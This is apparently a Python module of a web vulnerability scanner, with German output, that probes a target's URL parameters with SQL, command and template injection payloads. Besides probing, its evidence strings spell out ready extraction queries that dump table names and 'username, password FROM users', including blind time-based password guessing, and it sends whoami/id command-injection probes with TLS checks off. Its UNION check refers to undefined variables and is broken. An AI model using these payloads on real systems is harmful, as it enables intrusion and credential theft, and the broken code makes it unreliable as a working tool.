"""
Injection Scanner - SQL Injection, Command Injection, NoSQL Injection, SSTI
"""
import requests
import urllib.parse
import time

def scan(target):
    findings = []

    if not target.startswith('http'):
        target = f'https://{target}'

    print(f"[PHASE 15] Injection Scanner: Scanning {target}")

    # SQL Injection Tests
    sql_payloads = [
        "'", "''", "' OR '1'='1", "1' ORDER BY 100--",
        "1' AND 1=1--", "1' AND 1=2--",
        "1 UNION SELECT null--", "1 UNION SELECT null,null--",
    ]

    sql_errors = ['sql syntax', 'mysql_error', 'ORA-', 'PostgreSQL', 'sqlite_',
                  'You have an error in your SQL syntax', 'Unclosed quotation mark']

    params = ['id', 'page', 'user', 'product', 'cat', 'q', 'search']

    for param in params[:5]:
        for payload in sql_payloads[:5]:
            try:
                url = f"{target}?{param}={urllib.parse.quote(payload)}"
                resp = requests.get(url, timeout=10, verify=False)
                body_lower = resp.text.lower()
                for err in sql_errors:
                    if err.lower() in body_lower:
                        findings.append({
                            'id': 'SQLI-001',
                            'severity': 'critical',
                            'type': 'sql_injection',
                            'title': f"SQL Injection (Error-based) in Parameter '{param}' - DATEN AUSLESBAR!",
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': (
                                f"SQL ERROR gefunden: '{err}'\n\n"
                                f"=== Moegliche Daten-Extraktion: ===\n"
                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--\n"
                                f"    → DB-Version auslesen\n"
                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--\n"
                                f"    → DB-Name auslesen\n"
                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--\n"
                                f"    → ALLE Tabellennamen\n"
                                f"  {payload} AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,':',password) FROM users),0x7e))--\n"
                                f"    → User + Passwoerter!\n\n"
                                f"HTTP Status: {resp.status_code}"
                            ),
                            'remediation': 'Parameterized Queries/Prepared Statements verwenden. Eingabe validieren. ORM nutzen.'
                        })
                        return findings
            except:
                continue

    # Time-based SQL Injection
    time_payloads = [
        ("1' AND SLEEP(5) --", 5),
        ("1'; SELECT pg_sleep(5) --", 5),
    ]
    for param in params[:3]:
        for payload, delay in time_payloads:
            try:
                url = f"{target}?{param}={urllib.parse.quote(payload)}"
                start = time.time()
                requests.get(url, timeout=delay+3, verify=False)
                elapsed = time.time() - start
                if elapsed >= delay * 0.8:
                    findings.append({
                        'id': 'SQLI-002',
                        'severity': 'critical',
                        'type': 'sql_injection_blind',
                        'title': f"Blind SQL Injection (Time-based) in Parameter '{param}' - DATEN AUSLESBAR!",
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': (
                            f"Response dauerte {elapsed:.1f}s (Payload fordert {delay}s Delay).\n\n"
                            f"=== Time-Based Daten-Extraktion (Buchstabe fuer Buchstabe): ===\n"
                            f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT version()),1,1))>64,SLEEP(5),0)--\n"
                            f"    → Ist erster Buchstabe der Version > 'A'?\n"
                            f"  {param}=1' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(5),0)--\n"
                            f"    → Erster Buchstabe des Passworts > 'A'?\n"
                            f"  {param}=1' AND IF((SELECT COUNT(*) FROM information_schema.tables)>10,SLEEP(5),0)--\n"
                            f"    → Mehr als 10 Tabellen?\n\n"
                            f"Mit 5s Delay pro Bit kann man die komplette DB auslesen!"
                        ),
                        'remediation': 'Parameterized Queries verwenden. Timeouts auf Application-Level setzen.'
                    })
                    return findings
            except:
                continue

    # UNION-based Test
    union_payloads = [
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' UNION SELECT 'test','test','test'--",
        "1 UNION SELECT NULL,NULL--",
    ]
    for param in params[:5]:
        for payload in union_payloads:
            try:
                url = f"{target}?{param}={urllib.parse.quote(payload)}"
                resp = requests.get(url, timeout=10, verify=False)
                if body and ('NULL' in body or 'test' in body.lower()):
                    if code == 200:
                        col_count = payload.count('NULL') + (1 if 'test' in payload else 0)
                        findings.append({
                            'id': 'SQLI-003',
                            'severity': 'critical',
                            'type': 'sql_injection_union',
                            'title': f"UNION SQL Injection in Parameter '{param}' - DIREKTER DATENZUGRIFF!",
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': (
                                f"UNION Payload reflektiert in Response. HTTP {resp.status_code}. {col_count} Spalten.\n\n"
                                f"=== DIREKTE Daten-Extraktion via UNION: ===\n"
                                f"  {param}={payload.rstrip('--')} version()--\n"
                                f"    → DB-Version\n"
                                f"  {param}={payload.rstrip('--')} user(),database()--\n"
                                f"    → User + DB-Name\n"
                                f"  {param}={payload.rstrip('--')} table_name,column_name FROM information_schema.columns WHERE table_schema=database() LIMIT 1--\n"
                                f"    → Tabellen + Spalten\n"
                                f"  {param}={payload.rstrip('--')} username,password FROM users--\n"
                                f"    → ALLE User + Passwoerter!\n\n"
                                f"UNION ist die SCHNELLSTE SQLi-Methode - direkter Zugriff!"
                            ),
                            'remediation': 'Prepared Statements. Spaltenanzahl validieren.'
                        })
                        return findings
            except:
                continue

    # Command Injection
    cmd_payloads = ['; whoami', '| whoami', '$(whoami)', '; id', '| id', '; uname -a']
    cmd_indicators = ['root:', 'daemon:', 'administrator', 'Linux ', 'Darwin ']

    for param in params[:3]:
        for payload in cmd_payloads[:4]:
            try:
                url = f"{target}?{param}={urllib.parse.quote(payload)}"
                resp = requests.get(url, timeout=10, verify=False)
                for ind in cmd_indicators:
                    if ind.lower() in resp.text.lower():
                        findings.append({
                            'id': 'CMDI-001',
                            'severity': 'critical',
                            'type': 'command_injection',
                            'title': f'Command Injection in "{param}"',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'evidence': f'Command Output gefunden: "{ind}" in Response',
                            'remediation': 'OS-Commands vermeiden, Input validieren'
                        })
                        return findings
            except:
                continue

    # SSTI
    ssti_payloads = ['{{7*7}}', '${7*7}', '<%= 7*7 %>']
    for param in params[:3]:
        for payload in ssti_payloads:
            try:
                url = f"{target}?{param}={urllib.parse.quote(payload)}"
                resp = requests.get(url, timeout=10, verify=False)
                if '49' in resp.text or '7777777' in resp.text:
                    findings.append({
                        'id': 'SSTI-001',
                        'severity': 'critical',
                        'type': 'ssti',
                        'title': f'Server-Side Template Injection in "{param}"',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'evidence': f'Template Evaluation: {payload} -> 49',
                        'remediation': 'Templates sandboxen, User-Input nicht rendern'
                    })
                    return findings
            except:
                continue

    if not findings:
        findings.append({
            'id': 'INJ-OK',
            'severity': 'info',
            'type': 'injection_scan',
            'title': 'Keine Injection-Schwachstellen gefunden',
            'url': target,
            'evidence': 'SQLi, CMDi, SSTI Payloads getestet',
            'remediation': 'Weiterhin Input validieren'
        })

    return findings
